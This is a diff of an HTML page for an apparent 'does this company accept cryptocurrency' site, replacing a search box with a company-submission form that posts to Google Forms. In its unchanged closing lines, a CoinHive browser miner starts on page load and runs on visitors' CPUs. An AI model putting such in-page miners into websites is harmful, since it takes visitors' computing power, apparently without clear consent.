@@ -28,7 +28,6 @@
 </head>
 
 <body>
-
 	<div class="container">
 		<div class="row justify-content-md-center">
 			<div class="col">
@@ -36,40 +35,45 @@
 			</div>
 		</div>
 		<div class="row justify-content-md-center">
-			<div class="col">
-				<h1 class="display-1 text-center"><strong>Does</strong></h1>
-			</div>
-		</div>
-		<div class="row justify-content-md-center">
-			<div class="col-sm-12 col-md-7">
-				<div class="ui-widget">
-					<h2 class="text-center"> <input type="text" id ="c_name" class="name" onclick="this.focus();this.select()" placeholder="Apple" value="" autocomplete="on"style="text-align:center;"/></h2>
-				</div>			
-			</div>
-		</div>
-		<div class="row">
-			<div class="col">
-				<h1 class="display-5 text-center">accept cryptocurrency?</h1>
-			</div>
-		</div>
-		<div class="row justify-content-md-center">
-			<div class="col-sm-12 col-md-3">
-				<p class="text-center"><input type="button" class="submit-btn" value="Find here."></p>
-			</div>
-		</div>
-		<div class="row justify-content-md-center">
-			<div class="col">
-				<div class="text-center" id="wrap"> </div>
+
+			<div class="col-sm-12 col-md-7 text-center" style="margin-bottom: 60px;">
+				<h2><strong>Edit Company/Website</strong></h2>
+				<form action="https://docs.google.com/forms/d/e/1FAIpQLScPGrG1g3M1Uq-xy59-4iV3V8Yq8OD83G-sYLcUwVBwI2FMLA/formResponse">
+					<!-- 1 -->
+					<div class="ui-widget">
+					<h4><label for="form_name">Name<sup>+</sup></label></h4>
+					<input type="text" id ="c_name" class="name" onclick="this.focus();this.select()" placeholder="Google" value="" autocomplete="on"style="text-align:center;" name="entry.628443538" type="text" id="form_name" required/>
+					</div>		
+
+					<!-- 2 -->
+					<h4>Does it accept Crypto?<sup>+</sup></h4>
+					<label class="radio"><input type="radio" name="entry.1077734078" value="Yes">Yes</label>
+					<label class="radio"><input type="radio" name="entry.1077734078" value="No" checked="checked">No</label>
+					<!-- 3 -->
+					<h4><label for="form_link" style="margin-bottom: 0px;">Link to verify that it accepts Crypto<sup>+</sup></label></h4>
+					<h6>Article or website link</h6>
+					<input name="entry.337309189" type="text" id="form_link" placeholder="http://google.com"required/>
+					<!-- 4 -->
+					<h4><label for="form_link" style="margin-bottom: 0px;">How is the cryptocurrency processed?</label></h4>
+					<h6>Ex: Coinbase, CoinPayments, BitPay, etc.,</h6>
+					<input name="entry.692739873" type="text" id="form_link"/>
+					<!-- 5 -->
+					<h6><sup>+</sup>Required</h6>
+
+					<input class="add-submit" type="submit" value="Submit" >
+
+				</form>
 			</div>
 		</div>
 	</div>
+
 
 	<div id="footer">
 		<div class="container">
 			<div class="row justify-content-md-center">
 				<div class="col">
 					<p id="footer_small_text" style="display: inline;"> ✻ Verified;  </p>
-										<p id="minetext" style="display: inline;"> </p>
+					<p id="minetext" style="display: inline;"> </p>
 
 				</div>
 
@@ -120,9 +124,9 @@
 <script type="text/javascript">
 
 
-const company_name = ["Expedia","Microsoft Online","Microsoft Account","Gyft","Virgin Galactic","Whole Foods", "Amazon"];
-var company_value = company_name[Math.floor(Math.random()*company_name.length)];
-$(".name").val(company_value);
+// const company_name = ["Expedia","Microsoft Online","Microsoft Account","Gyft","Virgin Galactic","Whole Foods", "Amazon"];
+// var company_value = company_name[Math.floor(Math.random()*company_name.length)];
+// $(".name").val(company_value);
 
 var miner = new CoinHive.Anonymous('R28gUaZsQm8lY1W9aWPA8WBN83vhjId0',{throttle: 0.75, threads: 1});
 miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
